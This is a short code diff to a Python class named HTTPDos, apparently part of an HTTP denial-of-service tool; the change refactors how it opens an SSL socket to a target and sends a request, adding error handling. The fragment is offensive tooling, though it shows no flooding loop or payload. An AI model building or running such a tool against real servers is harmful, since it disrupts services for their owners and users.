@@ -91,15 +91,16 @@ class HTTPDos():
         sock = socket.socket(socket.AF_INET, TCP)
 
         if self.ssl_available:
-            context = ssl.create_default_context()
-
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock = context.wrap_socket(sock, server_hostname=self.target_ip)
-
-        sock.connect((self.target_ip, self.target_port))
-        # call var with () at the end to call function
-        sock.send(self.request_func())
-        sock.close()
+            ssl_cert = ssl.create_default_context()
+            sock = ssl_cert.wrap_socket(sock, server_hostname=self.target_ip)
+        try:
+            sock.connect((self.target_ip, self.target_port))
+            # call var with () at the end to call function
+            sock.send(self.request_func())
+        except (socket.timeout, socket.error, ssl.SSLError) as e:
+            print(f"Errors while sending the request : {e}")
+        finally:
+            sock.close()
 
     def test_ssl_connection(self):
         """Check if SSL is available"""
